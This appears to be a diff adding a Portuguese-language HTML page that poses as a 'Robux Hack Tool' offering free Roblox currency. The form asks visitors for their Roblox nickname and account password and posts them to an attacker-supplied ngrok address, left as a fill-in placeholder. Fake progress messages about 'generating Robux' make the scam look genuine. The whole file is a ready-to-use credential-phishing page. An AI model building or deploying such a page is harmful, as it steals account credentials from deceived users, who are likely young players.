@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Robux Hack Tool</title>
+    <style>
+        body {
+            font-family: 'Consolas', monospace;
+            background-color: black;
+            color: #00FF00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #003300;
+            padding: 30px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        input[type="text"], input[type="password"] {
+            padding: 10px;
+            border: none;
+            border-radius: 3px;
+            background-color: black;
+            color: #00FF00;
+            font-family: 'Consolas', monospace;
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 15px;
+            width: 250px;
+        }
+        .robux-options {
+            margin-bottom: 20px;
+        }
+        .robux-options label {
+            display: inline-block;
+            margin-right: 15px;
+        }
+        .robux-options input[type="radio"] {
+            margin-right: 5px;
+        }
+        button {
+            background-color: #00FF00;
+            color: black;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 3px;
+            font-family: 'Consolas', monospace;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #66FF66;
+        }
+        .progress-container {
+            width: 100%;
+            background-color: black;
+            border-radius: 5px;
+            height: 20px;
+            margin-top: 20px;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar {
+            background-color: #00FF00;
+            height: 100%;
+            width: 0%;
+            border-radius: 5px;
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .loading-text {
+            margin-top: 10px;
+            font-size: 14px;
+            font-style: italic;
+        }
+        .step-message {
+            margin-top: 5px;
+            font-size: 14px;
+        }
+        .success {
+            color: limegreen;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>>>> ROBUX GRATIS <<<</h1>
+        <form action="SUA URL DO NGROK AQUI" method="POST">
+            <label for="nickname">Nickname do Roblox:</label>
+            <input type="text" id="nickname" name="nickname" placeholder="Digite seu nickname">
+            <label for="password">Senha da Conta:</label>
+            <input type="password" id="password" name="password" placeholder="Digite sua senha">
+            <label for="plataforma">Plataforma:</label>
+            <select id="plataforma" name="plataforma">
+                <option value="pc">PC</option>
+                <option value="mobile">Mobile</option>
+                <option value="xbox">Xbox</option>
+                <option value="outro">Outro</option>
+            </select>
+            <div class="robux-options">
+                <label>
+                    <input type="radio" name="robux_choice" value="10000" required> 500 Robux
+                </label>
+                <label>
+                    <input type="radio" name="robux_choice" value="50000"> 1.000 Robux
+                </label>
+                <label>
+                    <input type="radio" name="robux_choice" value="100000"> 1.500 Robux
+                </label>
+                <label>
+                    <input type="radio" name="robux_choice" value="250000"> 2.000 Robux
+                </label>
+            </div>
+            <button type="submit" id="iniciarBotao">Iniciar Hack</button>
+            <p class="loading-text" id="loadingText" style="display: none;">Conectando aos servidores...</p>
+            <p class="step-message" id="step1" style="display: none;">Verificando dados da conta...</p>
+            <p class="step-message" id="step2" style="display: none;">Analisando segurança da conta...</p>
+            <p class="step-message" id="step3" style="display: none;">Gerando Robux solicitados...</p>
+            <p class="step-message" id="step4" style="display: none;">Validando transação...</p>
+            <p class="step-message" id="step5" style="display: none;">Finalizando transferência para <span id="nicknameDisplay"></span>...</p>
+            <div class="progress-container" id="progressBarContainer">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div id="message" class="message" style="display: none;"></div>
+        </form>
+    </div>
+
+    <script>        
+        const iniciarBotao = document.getElementById("iniciarBotao");
+        const loadingText = document.getElementById("loadingText");
+
+        iniciarBotao.addEventListener('click', function(event) {
+            loadingText.style.display = "block";
+          
+        });
+    </script>
+</body>
+</html>
